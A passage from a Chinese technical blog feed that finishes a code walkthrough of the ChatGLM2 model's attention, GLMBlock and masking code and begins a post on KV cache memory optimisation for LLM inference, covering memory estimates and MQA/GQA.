class="hljs-keyword">if</span> self.multi_query_attention:<br>    key_layer = key_layer.unsqueeze(-<span class="hljs-number">2</span>)<br>    key_layer = key_layer.expand(<br>        -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, self.num_attention_heads_per_partition // self.num_multi_query_groups_per_partition, -<span class="hljs-number">1</span><br>    )<br>    key_layer = key_layer.contiguous().view(<br>        key_layer.size()[:<span class="hljs-number">2</span>] + (self.num_attention_heads_per_partition, self.hidden_size_per_attention_head)<br>    )<br>    value_layer = value_layer.unsqueeze(-<span class="hljs-number">2</span>)<br>    value_layer = value_layer.expand(<br>        -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, self.num_attention_heads_per_partition // self.num_multi_query_groups_per_partition, -<span class="hljs-number">1</span><br>    )<br>    value_layer = value_layer.contiguous().view(<br>        value_layer.size()[:<span class="hljs-number">2</span>] + (self.num_attention_heads_per_partition, self.hidden_size_per_attention_head)<br>    )<br></code></pre></td></tr></table></figure><ul><li>执行注意力计算和最后的输出线性层计算，这里的代码就很简单了。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ==================================</span><br><span class="hljs-comment"># core attention computation</span><br><span class="hljs-comment"># ==================================</span><br><br>context_layer = self.core_attention(query_layer, key_layer, value_layer, attention_mask)<br><br><span class="hljs-comment"># =================</span><br><span class="hljs-comment"># Output. [sq, b, h]</span><br><span class="hljs-comment"># =================</span><br><br>output = self.dense(context_layer)<br><br><span class="hljs-keyword">return</span> output, kv_cache<br></code></pre></td></tr></table></figure><h4 id="MLP">MLP</h4><p>ChatGLM2 的 MLP 层与 llama 的略有不同。但都有两层全连接层，以及中间的激活层 swiglu。代码比较平凡，就不细说了。</p><p><img src="/img/LLM/ChatGLM2MLP.png" alt=""></p><h3 id="ChatGLM2-中间件">ChatGLM2 中间件</h3><p>ChatGLM2 中间件的核心是 <code>GLMBlock</code>，<code>GLMBlock</code> 包含了三个组成成分：一）在注意力前后的 LayerNorm 层，二）注意力层，三）在最后的 MLP 层：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GLMBlock</span>(torch.nn.Module):<br>    <span class="hljs-string">&quot;&quot;&quot;A single transformer layer.</span><br><span class="hljs-string">    Transformer layer takes input with size [s, b, h] and returns an</span><br><span class="hljs-string">    output of the same size.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config: ChatGLMConfig, layer_number, device=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-comment"># ...</span><br>        LayerNormFunc = RMSNorm <span class="hljs-keyword">if</span> config.rmsnorm <span class="hljs-keyword">else</span> LayerNorm<br>        <span class="hljs-comment"># Layernorm on the input data.</span><br>        self.input_layernorm = LayerNormFunc(config.hidden_size, eps=config.layernorm_epsilon, device=device,<br>                                             dtype=config.torch_dtype)<br><br>        <span class="hljs-comment"># Self attention.</span><br>        self.self_attention = SelfAttention(config, layer_number, device=device)<br>        self.hidden_dropout = config.hidden_dropout<br><br>        <span class="hljs-comment"># Layernorm on the attention output</span><br>        self.post_attention_layernorm = LayerNormFunc(config.hidden_size, eps=config.layernorm_epsilon, device=device,<br>                                                      dtype=config.torch_dtype)<br><br>        <span class="hljs-comment"># MLP</span><br>        self.mlp = MLP(config, device=device)<br></code></pre></td></tr></table></figure><p>多个 <code>GLMBlock</code> 堆叠起来，组成一个 <code>GLMTransformer</code> 层。<code>GLMTransformer</code> 层的最后还会额外附上一层 LayerNorm，这部分代码平凡。</p><p><code>GLMBlock</code> 的 forward 函数很好地描述了 <code>GLMBlock</code> 架构以及数据流向：先是 layernorm 层，再是注意力层，旁路使用残差结构，随后跟上 dropout 层和 Layernorm 层，最后是 MLP 层和 dropout 层，这些数据通路在之前的 ChatGLM2 架构图上描绘得很清楚，读者可参见<a href="https://huggingface.co/THUDM/chatglm2-6b/blob/main/modeling_chatglm.py#L536">代码</a>。</p><p><code>GLMTransformer</code> 类则是将若干个 <code>GLMBlock</code> 做堆叠封装，并在网络的最后加入一层 layernorm 层。其 forward 函数中包含了 checkpoint 相关的代码👇，之前在 <a href="https://dingfen.github.io/ai/2023/11/30/huggingface2.html">llama 详解的博客</a>中我们提到过，使用 gradient_checkpointing 可以有效节约显存，因为前推时程序不保存中间计算值。而 use_cache 是通过消耗空间换时间。因此若 gradient_checkpointing 和 use_cache 都打开，那么两者可能会互相抵消优化影响，故模型不支持两者同时为 True。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params"></span><br><span class="hljs-params">        self, hidden_states, attention_mask, rotary_pos_emb, kv_caches=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        use_cache: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">True</span>,</span><br><span class="hljs-params">        output_hidden_states: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bool</span>] = <span class="hljs-literal">False</span>,</span><br><span class="hljs-params"></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kv_caches:<br>        kv_caches = [<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.num_layers)]<br>    presents = () <span class="hljs-keyword">if</span> use_cache <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">if</span> self.gradient_checkpointing <span class="hljs-keyword">and</span> self.training:<br>        <span class="hljs-keyword">if</span> use_cache:<br>            logger.warning_once(<br>                <span class="hljs-string">&quot;`use_cache=True` is incompatible with gradient checkpointing. Setting `use_cache=False`...&quot;</span><br>            )<br>            use_cache = <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># ...</span><br></code></pre></td></tr></table></figure><h3 id="ChatGLM2-Model">ChatGLM2 Model</h3><p><code>ChatGLMPreTrainedModel</code> 类是一个基抽象类，负责处理 mask 和 position_id 等。<code>ChatGLMModel</code> 继承了它，<code>ChatGLMModel</code> 能囊括了 <code>GLMTransformer</code> 类，以及输出层 output layer；增加了对输入 <code>input_ids</code> 使用 torch.nn.Embedding 嵌入编码，以及对历史对话使用 <code>PrefixEncoder</code> 编码的环节等。</p><h4 id="ChatGLMPreTrainedModel">ChatGLMPreTrainedModel</h4><p>处理 position_id：根据输入的 input_ids 的形状：(batch_size, seq_len)，每个batch都从零开始递增标号：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_position_ids</span>(<span class="hljs-params">self, input_ids, device</span>):<br>    batch_size, seq_length = input_ids.shape<br>    position_ids = torch.arange(seq_length, dtype=torch.long, device=device).<br>    unsqueeze(<span class="hljs-number">0</span>).repeat(batch_size, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> position_ids<br></code></pre></td></tr></table></figure><p>处理 mask：attention mask 应当是一个下三角矩阵，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_masks</span>(<span class="hljs-params">self, input_ids, past_key_values, padding_mask=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-comment"># 首先初始化单位阵 维度 (bsz, seq_len, seq_len)，并取 tril_</span><br>    batch_size, seq_length = input_ids.shape<br>    full_attention_mask = torch.ones(batch_size, seq_length, seq_length, device=input_ids.device)<br>    full_attention_mask.tril_()<br><br>    <span class="hljs-comment"># 接上 KV cache 的 attention mask</span><br>    <span class="hljs-keyword">if</span> past_key_values:<br>        past_length = past_key_values[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].shape[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> past_length:<br>        full_attention_mask = torch.cat((torch.ones(batch_size, seq_length, past_length,<br>                                    device=input_ids.device), full_attention_mask), dim=-<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># padding_mask 是 bool tensor，两者相乘后，小于0.5的为 false</span><br>    <span class="hljs-keyword">if</span> padding_mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        full_attention_mask = full_attention_mask * padding_mask.unsqueeze(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> past_length <span class="hljs-keyword">and</span> padding_mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        full_attention_mask -= padding_mask.unsqueeze(-<span class="hljs-number">1</span>) - <span class="hljs-number">1</span><br>    full_attention_mask = (full_attention_mask &lt; <span class="hljs-number">0.5</span>).<span class="hljs-built_in">bool</span>()<br>    full_attention_mask.unsqueeze_(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> full_attention_mask<br></code></pre></td></tr></table></figure><hr><p><code>ChatGLMForConditionalGeneration</code> 类和 <code>ChatGLMForSequenceClassification</code> 类是用户（指 transformer框架）真正调用到的模型，他们俩内部都包含了 <code>ChatGLMModel</code> 类。</p><p>从架构层面看，<code>ChatGLMForConditionalGeneration</code> 在 ChatGLM 模型的最后上增加了损失函数 <code>CrossEntropyLoss</code>，以便训练；而 <code>ChatGLMForSequenceClassification</code> 类则在最后增加了一个线性层和 dropout 层用于 sequence classification，当然该类最后也会调用损失函数 <code>CrossEntropyLoss</code> 和 <code>BCEWithLogitsLoss</code>。</p><p>在用户与大模型发生交谈时，ChatGLM 模型会使用 transformer 架构下控制 token 生成的工具：logits processor。它可以通过控制 logits 概率，改变大模型吐出的 token。一个很常用的场景是控制大模型不吐出“敏感词”，可以加一个敏感词列表，让大模型在吐出该词前换一个词或者干脆不产生敏感词。<a href="https://blog.csdn.net/yjh_SE007/article/details/132259230">这篇博客</a>里介绍了自定义 LogitsProcessor 的方法。</p><h3 id="总结">总结</h3><p>至此，我有详有略地给大家展示了 chatglm2 模型的架构和代码实现。总的来说，该模型架构基本相似于其他主流的大模型。在看过 llama 模型的具体实现后，chatglm2 给我一种很熟悉又陌生的感觉。熟悉在于其架构和数据通路层面的相似感，而陌生在于 chatglm2 模型在具体计算注意力时采用了不同寻常的张量形状，不仅与其他大模型相异，也与 torch 的注意力函数接口不同。</p><p>从使用体验上说，ChatGLM2 是一款非常不错的中英文对话大模型，几轮对话下来基本符合预期。其6B的大小对新手和个人玩家友好，值得有条件的各位试试😄。</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>Transformer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大模型推理优化技术之显存优化</title>
    <link href="/2023/11/30/2023-11-30-LLM-KVCache/"/>
    <url>/2023/11/30/2023-11-30-LLM-KVCache/</url>
    
    <content type="html"><![CDATA[<h1>大模型推理优化技术之 KV Cache</h1><h2 id="前言">前言</h2><p>推理大模型时充分榨干 GPU 的性能是每个程序员所追求的。不过，要做到这一点，我们首先需要知道大模型推理的具体步骤，并分析它的性能瓶颈是什么，是受到算力限制还是内存限制，从而方便我们下一步的优化。而目前业内认为 LLM 模型的推理性能主要受限于内存。</p><p>KV Cache 是大模型推理性能优化的最常用技术。该技术可以在不影响计算精度的前提下，以空间换时间，提高推理性能。目前业界主流 LLM 推理框架均默认支持并开启了该功能。在咱们之前介绍 huggingface llama 实现的博客中有提到过，当 <code>use_cache = True</code> 时，KV cache 功能就默认打开。那么什么是 KV cache 呢？它又是如何加速大模型推理性能的呢？</p><h2 id="原理">原理</h2><p>要尝试理解 KV cache，就不得不提及当前大模型的一般推理过程。事实上，目前大多数热门的 LLM （例如 GPT-3）的推理部分本质上是一个译码器（decoder）。它们针对输入的序列文本，一个词一个词地输出文本。具体地说，这些 LLM 接受一系列 token 作为输入，并以自回归方式输出后续的 token，直到它们满足条件要求（例如，已达到生成的 token 数量或遇到停止词），或直到它生成特殊的<end>标记标志着生成过程的结束。此过程涉及两个阶段：预填充阶段（prefill phase）和译码阶段（decode phase）。</p><p>所谓 token 实际上描述模型中未被转化成人类语言的序列文本，参见下面的解释：</p><blockquote><p>tokens are the atomic parts of language that a model processes. One token is approximately four English characters. All inputs in natural language are converted to tokens before inputting into the model.</p></blockquote><h3 id="预填充阶段">预填充阶段</h3><p>在预填充阶段，LLM 处理输入 token 以计算 transformer 架构中 decoder 的 Key 和 Value 矩阵，此时 decoder 参与计算的 Query 矩阵为空（随机数）。根据 transformer 的计算过程（读者可参考网上海量介绍 transform 的文章），这些矩阵用于输出第一个 token。然后，每个新 token 都依赖于之前的所有的 token，但由于输入是完全已知的，因此从高层次看，这是一个可高度并行的矩阵运算，能充分发挥 GPU 的利用率。</p><h3 id="译码阶段">译码阶段</h3><p>在译码阶段，LLM 一次自回归生成一个输出 token，直到满足条件为止。每个连续输出 token 都需要知道先前迭代的所有输出 key 和 value。此时 Query 的序列长度是 1，而 key 和 value 的长度则是之前产生的所有输出长度，这就像是矩阵向量运算，与预填充阶段相比，它未充分利用 GPU 计算能力。GPU 的处理速度受限于数据（权重、键、值、激活）从内存传输到计算单元的速度。因此，这是个内存限制的运算阶段。</p><p>注意，不同的 LLM 可能会使用不同的 tokenizer ，而不同的 tokenizer 产生的 token 数量和其代表的含义也有区别。若要比较它们之间的输出 token 也并不简单。而我们容易犯的一个谬误是：<u>在比较推理吞吐量时，直接观察单位时间内产生的 token 数量。然而，即使两个 LLM 的每秒输出 token 相似，但如果它们使用不同的 tokenizer，那么它们真实的推理性能可能不相同</u>。这是因为两者的 token 可能表示不同数量的字符。</p><p><a href="https://dingfen.github.io/ai/2023/10/30/huggingface1.html#forward-%E5%AE%9E%E7%8E%B0">再回顾一下 transformer 中计算注意力权重的过程</a>：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>t</mi><mi>t</mi><mi>n</mi><mo>=</mo><mi>s</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mfrac><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><mi>d</mi></msqrt></mfrac><mo stretchy="false">)</mo><mi>V</mi></mrow><annotation encoding="application/x-tex"> Attn = softmax(\frac{QK^T}{\sqrt{d}})V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal">tt</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4483em;vertical-align:-0.93em;"></span><span class="mord mathnormal">so</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.1778em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal">d</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span></p><p>decoder 的输入在进入译码层后，就会分别经过 query key value 三个线性层，变为 Q K V 矩阵，然后进入 Masked multi head attention 做下图的运算。图中的 mask 是为了防止当前生成的 token 根据未来 token 的信息产生。</p><center><img src="/img/LLM/kvcache.png"></center><p>注意到，Transformer 模型具有自回归推理的特点，即每次推理都会将上次推理输出的结果作为输入的一部分，而每次推理会输出下一个 token，反复执行多次后得到最终的输出。因此，推理时，Transformer 的前后两轮的输出只相差一个 token，存在重复计算！</p><p>比如，图上例子中，若不使用 KV cache 技术，在推理生成“学”和“生”字时，前三行的 QK 矩阵和注意力矩阵的值都是<em>一样的</em>。以第一行为例，注意力矩阵的向量值取决于 Q 矩阵的第一行（K V 咱不关心）。每次计算得到的注意力矩阵向量，只有最后一行是<em>全新的</em>，用于产生新的 output。</p><p>因此，KV Cache 的办法就是将之前已经计算过的张量保存下来，下次推理时直接计算一行 Q 矩阵就行了，前面的数据可以直接使用之前保存的张量，避免重复计算。</p><h2 id="实现">实现</h2><p>KV cache 技术已经应用在 huggingface transformer 库中：<a href="https://github.com/huggingface/transformers/blob/main/src/transformers/models/gpt2/modeling_gpt2.py#L318C1-L331C97">代码</a>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">query = self._split_heads(query, self.num_heads, self.head_dim)<br>key = self._split_heads(key, self.num_heads, self.head_dim)<br>value = self._split_heads(value, self.num_heads, self.head_dim)<br><br><span class="hljs-keyword">if</span> layer_past <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>  past_key, past_value = layer_past<br>  key = torch.cat((past_key, key), dim=-<span class="hljs-number">2</span>)<br>  value = torch.cat((past_value, value), dim=-<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">if</span> use_cache <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>  present = (key, value)<br><span class="hljs-keyword">else</span>:<br>  present = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">if</span> self.reorder_and_upcast_attn:<br>  attn_output, attn_weights = self._upcast_and_reordered_attn(query, key, value, attention_mask, head_mask)<br><span class="hljs-keyword">else</span>:<br>  attn_output, attn_weights = self._attn(query, key, value, attention_mask, head_mask)<br></code></pre></td></tr></table></figure><p>准备好 query key 和 value 矩阵后，当 <code>layer_past</code> 非空（事实上第一个词生成后就是非空的），那么直接将 <code>past_key</code> 和 <code>past_value</code> 取出，然后concat连接起来组成这次推理的 <code>key</code> 和 <code>value</code> 值。</p><p>KV cache 可在内存空间充足的场景下使用，能有效地提升推理性能。但需要注意的是，如果生成的序列非常长（大于 2048 ）那么就很有可能出现 out of Memory。都说 LLM 训练和推理时内存开销巨大，那么到底有多大呢？程序员该如何快速评估一个 LLM 推理时大致需要消耗多少内存？</p><h3 id="内存开销粗算">内存开销粗算</h3><p>粗略地看，LLM 在 GPU 上推理时，有两样东西占用了最多的内存空间：</p><ul><li>模型权重：模型参数占用内存。以 Llama-2-7b 为例（70 亿参数），通常使用 FP16 加载时，那么显存大小约为 70 亿 × 2 字节（FP16）= 14 GB。</li><li>KV cache：被缓存起来的自注意力张量。现在我们粗略计算一下 KV cache 占用的内存大小。首先，每一个 transformer 子层都含有一层注意力层，每层注意力都需要一个 KV cache，KV cache 中一个向量的维度是 <code>hidden_size</code>。再考虑 <code>batch_size</code> 和  <code>seq_len</code>，每个输出的 token 都需要这样的 KV cache，而 GPU 通常会同时并行处理 <code>batch_size</code> 个这样的输入/输出，于是有：</li></ul><p><strong>KV cache size per token = 2 * batch_size * seq_len * num_layers * hidden_size * sizeof(data_type)</strong></p><p>第一个系数为 2 表示了 Key 和 Value 矩阵。以<a href="https://dingfen.github.io/ai/2023/10/30/huggingface1.html">之前博客</a>中的 llama-2-7b 的配置文件为例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;architecture&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;LlamaForCausalLM&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;hidden_act&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;silu&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;hidden_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4096</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;initializer_range&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.02</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;intermediate_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11008</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;max_position_embeddings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4096</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;model_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;llama&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;num_attention_heads&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;num_hidden_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;num_key_value_heads&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;pretraining_tp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;rms_norm_eps&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1e-05</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>当执行的输入 batch 大小是 2，输入序列的长度为 512 时，即输入 token 矩阵维度是 <code>(bsz, seq_len, hidden_size) = (2, 512, 4096)</code> ，权重数据类型为 FP16 时：</p><p>KV Cache 大小 = 2 * batch_size * seq_len * num_layers * hidden_size * sizeof(data_type) = 2 * 2 * 512 * 32 * 4096 * 2 = 512 MB</p><p>额，遗憾的是，512 MB 大小已经不能称之为 Cache 了，这样大小的缓存显然无法放进当前任何一款显卡的 L2/3 Cache 中。现在英伟达最好的卡 H100 的 SRAM 缓存大概是 50MB，而 A100 则是 40MB，差的可不是一点半点。所以，我们对 KV Cache 的优化还未止步。</p><h2 id="KV-Cache-的推理优化">KV Cache 的推理优化</h2><p>回到之前我们给出的公式：</p><p>KV Cache Size = 2 * batch_size * seq_len * num_layers * hidden_size * sizeof(data_type)</p><p>上面的公式中，<code>batch_size</code> 取决于用户输入，而 <code>num_layers</code> 和 <code>hidden_size</code> 是架构的基本（擅自改动会影响模型表现），那么针对 KV cache 的进一步优化就只能从以下四方面入手：</p><ul><li>kv_heads：MQA/GQA 技术，减少 KV 的头数，进而减少显存占用</li><li>seq_len： 通过减少序列长度, 以减少 KV Cache 大小，如使用循环队列管理窗口 KV</li><li>KV-Cache：从操作系统的内存管理角度，减少碎片，如 Paged Attention</li><li>data type: 从量化角度减少 KV cache 的宽度，如使用 LLM-QAT 进行量化</li></ul><p>接下来，我们简要地介绍一下这四项优化技术。</p><h3 id="GQA-MQA-优化技术">GQA/MQA 优化技术</h3><p>在 transformer 中，最原始的是 MHA(Multi-Head Attention)，Query Key Value 三部分有相同数量的头，并一一对应。每次做注意力计算，每个头的这三个矩阵按上文所述的公式计算完成后，将所有头的结果拼接起来就行（见下图右上部分）。</p><center><img src="/img/LLM/The-Transformers-architecture-Multi-Head-Attention-consists-of-several-attention-layers.ppm" /></center><p>MQA(Multi Query Attention) 对此提出的改进是：保持 Query 的头数，但 Key 和 Value 只能有一个头，相当于所有的 Query 矩阵共享一组 Key 和 Value 矩阵。直观来看，这的确大幅减少了 KV Cache 大小，而实验结果表明，这样改进能提高 30%-40% 的吞吐，却只会稍微影响模型效果，具体可参看 <a href="https://arxiv.org/abs/2307.09288">Llama2 论文</a>。</p><center><img src="https://pic3.zhimg.com/v2-69c2cc88b213a65d61cee7a9f31d844e_r.jpg">Table 18: Attention architecture ablations. We report 0-shot results for all tasks except MMLU(5-shot) and GSM8K(8-shot). For GSM8K and Human-Eval we report maj@1 and pass@1 results. For NQ and TriviaQA we report EM. For all other tasks we report accuracy.</center><p>由于 MQA 改变了注意力机制的结构，因此模型通常需要从训练开始就支持 MQA 。也可以通过对已经训练好的模型进行微调来添加多查询注意力支持，仅需要约 5% 的原始训练数据量就可以达到不错的效果。包括 Falcon、SantaCoder、StarCoder 等在内很多模型都采用了 MQA 机制。</p><p>GQA(Grouped Query Attention)是一种介于 MHA 和 MQA 的折中方案。它将 Query Heads 分组，并在每组中共享一个 Key 和 一个 Value，使得 GQA 既能缩小 KV Cache ，加快推理速度，又不会损失过多的模型效果。Llama2 采用了 GQA 机制。</p><center><img src="/img/LLM/grouped-query attention.png"></center><h3 id="序列长度优化">序列长度优化</h3><p>仔细观察 LLM 推理时计算注意力的方式：token 的输出是串行的，上一个 token 的 Key 和 Value 可以被下一个 token 复用。若推理的文本很长（远长于训练时最长序列），那么我们可以牺牲模型的效果，舍弃掉过于久远的 token 以减少 KV Cache 的大小。另外，这也可以降低计算量，自注意力的时间复杂度是 token 序列的 $ \mathcal{O}(N^2)$（因为是 $ QK^T $，其中 $ Q $ 和 $ K $ 